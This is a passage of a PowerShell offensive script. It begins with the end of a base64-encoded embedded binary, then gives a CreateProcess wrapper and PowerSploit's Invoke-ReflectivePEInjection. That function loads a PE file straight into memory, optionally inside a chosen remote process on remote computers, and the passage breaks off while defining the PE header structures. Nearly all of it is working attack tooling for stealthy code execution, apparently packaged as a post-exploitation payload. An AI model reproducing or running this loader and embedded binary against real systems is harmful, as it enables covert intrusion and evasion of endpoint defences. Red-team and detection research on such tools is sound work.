AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAABABgAAAAYAACAAAAAAAAAAAAAAAAAAAABAAIAAAAwAACAAAAAAAAAAAAAAAAAAAAB
AAkEAABIAAAAYLAAAH0BAAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIH
N0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScg
bWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm
FzbS52MyI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAgIDxyZXF1ZXN0
ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0nYXNJbnZva2VyJyB1aUFjY2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3
RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAA0AAAAAEwDTATMB0wJzAyMD4wUTB9MIQx3zGRMpsyqzK4MsAy1TLkMu
ky9zL/MgUzCjMjM0UzSzOmM+8z9DMcNCM0KDQ4NIU0kzSjNNU03DThNPE0JTUqNTE1QTWLNeY17zVKNqI2zDbZNuY28TYm
NzM3RzdTN2I4ejiHOJQ4nzjGONI4ETkXOSE6Jzo2Okg6xzr9OjU7QjtPO1o72zslPDI8PzxKPII8tjzIPGQ9vz3zPR8+ZT
5qPog+lT6kPvI+/j4GPxY/KD/5PwAAACAAAOwAAAATMEExRzFmMXgx8zFJMnsyoTLjMugyBjMTMyIzzDPZM+Yz8TMhND80
UDRkNHs0gjS2NMU08jQGNXY10DVpNrw29jYIN0A3STdPN1U3azdzN3s3oDfON9Q33TfjN+k3/zcHOA84NjhcOGU4azh4OH
44hDiUOKY4rji2ON04TzmAOYY5jDmiOao5sjniOQ86HjokOio6QDpIOlA6iTqkOqo6sDrAOtI62jriOhI7OzteO287ezuE
O7471TvjO+w79jsZPCw8jzwUPXU9qz16Poc+oT70PhM/QT+KP5A/mj+gP64/0T8AMAAAsAAAAAMwTDBSMFwwYjCNML8wUD
LnMv0yJDM4M1szbDN4M4QzmDO7M8wz2DPkMxY0KDRrNHE0hTSMNJE0oTSnNMM0zjTpNPA09TQFNaE1yzUXNrY20zjjOPc4
GjkrOTc5QzlnOW05eTmtObo5xznSOQ06GjonOjI6bTp6Ooc6kjrNOto65zryOjk7TDviPBI9Qj1yPaI9tT3PPSo+Lz5APl
o+nz7CPtM+3z7rPgBAAACYAAAAJjA4MKIwrzC3MPMwADENMRgxSTFsMX0xiTGSMbAxvTHKMdUxdjKHMqgyrzK1MtEy5DL7
MgEzXDPXNKQ18jXYOOs4+TgCOQo5ODlFOTo7RztUO187xzvHPGo+gT6ZPr0+wj7MPts+4D7qPu8+9j4GPyM/KD8zPzk/QD
9IP00/Vj9bP2s/mT+pP8s/5z/wP/c/AFAAADABAAAHMCEwLzA5MEAwRTBVMGUwbDB0MMgwzjBWMW4xdTF6MZQxnzGtMfwx
CzIZMikyLjI5Mj8ySjJ9MooylzKiMt0y6jL3MgIzNzNFM5gzrTO6M8AzxjPMM9Iz2DPeM+Qz6jP2MxY0GzQqNIw0mzQlNU
A1WTW7Nf41SDZsNos2rjbnNvc2XTfMN484wDj2OB85LjlBOU05XTluOYQ5mzmwObc5vTnPOdk5NzpEOms6czqMOg07PDtM
O207cjuLO5A7nTvqOwc8ETwfPDE8UDyOPKA8Wj2NPdY9HD4hPjY+Pz5KPlE+cT53Pn0+gz6JPo8+lj6dPqQ+qz6yPrk+wD
7IPtA+2D7kPu0+8j74PgI/DD8cPyw/PD9FP2I/ej+AP5U/rT+zP70/1D8AAABgAADMAAAABTAiMDUwQzBeMGkw/TAGMQ4x
SjFeMWUxmzGkMa0xuzHEMdcxCzK2MtUy3zLwMgEzHjNqM4UzkTOgM6kztjPlM+0zAjQONBo0IDQmNDI0VTRdNGI0iDSNNO
A05jTsNPI0+DT+NAQ1CjUQNRY1HDUiNSg1LjU0NTo1QDVGNUw1UjVYNVY2cjaSNrI24jYMN0I3cTfiN6I4HDl9Oco5+DkF
Og46JDpnOoI6lzqgOqs6vjrLOtg64zr0Ov46CDsTOyE7JzsAAABwAAA0AQAA0DHYMdwx4DEAMgQyCDIQMhQyGDIcMiAyJD
IoMiwyQDJEMkgynDWgNaQ1qDWsNbA1tDW4Nbw1wDXENcg1zDXQNdQ12DXcNeA1nDegN6g31DfYN+g37Df0Nww4HDggODA4
NDg4OEA4WDhoOGw4fDiAOIQ4iDiQOKg4uDi8OMA42DjcOPA4ADkQORQ5LDkwOTQ5PDlUOVg5cDl0OYw5kDmUOZg5nDmwOb
Q5uDm8OcA51DnYOfA59DkMOhA6KDosOjQ6TDpQOmg6bDpwOnQ6eDp8OoA6hDqIOow6lDqYOpw6oDqkOqg6rDqwOrQ6uDrM
OtA64DrkOug6ADsEOwg7HDsgOzg7SDtYO2g7bDt0O4w7kDuoO7g7vDvUO9g73DvgO1A/cD+gP6g/3D/sP/g/AIAAAMgAAA
AAMBgwIDA4MEAwVDBkMHAweDCQMKAwvDDMMNgw4DD4MAAxGDEgMTQxRDFQMXAxgDGkMawxtDG8McQxzDHUMdwx6DEMMhQy
HDIkMiwyNDI8MkQyTDJUMmAygDKIMpAymDKgMqgytDLUMtwy5DLsMvQyADMgMygzMDM8M1wzZDNsM3gzmDOgM6gzxDPIM9
Az2DPgM+gz/DMUNBg0ODRYNHQ0eDSANIg0kDSUNJw0sDS4NMA0yDTMNNA02DTsNPQ0CDUAoAAAKAAAAAAwUDBsMIQwoDDI
MOgwODGIMaQx4DH8MTgydDKsMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="


function Invoke-CreateProcess {

    <#
        .DESCRIPTION
        
	    Author: Ruben Boonen (@FuzzySec)
	    License: BSD 3-Clause
	    Required Dependencies: None
	    Optional Dependencies: None
    #>

	param (
        [Parameter(Mandatory = $True)]
		[string]$Binary,
        [Parameter(Mandatory = $False)]
		[string]$Args=$null,
        [Parameter(Mandatory = $True)]
		[string]$CreationFlags,
        [Parameter(Mandatory = $True)]
		[string]$ShowWindow,
        [Parameter(Mandatory = $True)]
		[string]$StartF
	)  

    # Define all the structures for CreateProcess
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
		public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
		public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
		public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CreateProcess(
			string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
			ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
			IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
			out PROCESS_INFORMATION lpProcessInformation);
	}
"@
	
	# StartupInfo Struct
	$StartupInfo = New-Object STARTUPINFO
	$StartupInfo.dwFlags = $StartF # StartupInfo.dwFlag
	$StartupInfo.wShowWindow = $ShowWindow # StartupInfo.ShowWindow
	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
	
	# ProcessInfo Struct
	$ProcessInfo = New-Object PROCESS_INFORMATION
	
	# SECURITY_ATTRIBUTES Struct (Process & Thread)
	$SecAttr = New-Object SECURITY_ATTRIBUTES
	$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
	
	# CreateProcess --> lpCurrentDirectory
	$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
	
	# Call CreateProcess
	[Kernel32]::CreateProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, $CreationFlags, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
	
	return $ProcessInfo.dwProcessId
}

function Invoke-ReflectivePEInjection
{
<#

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
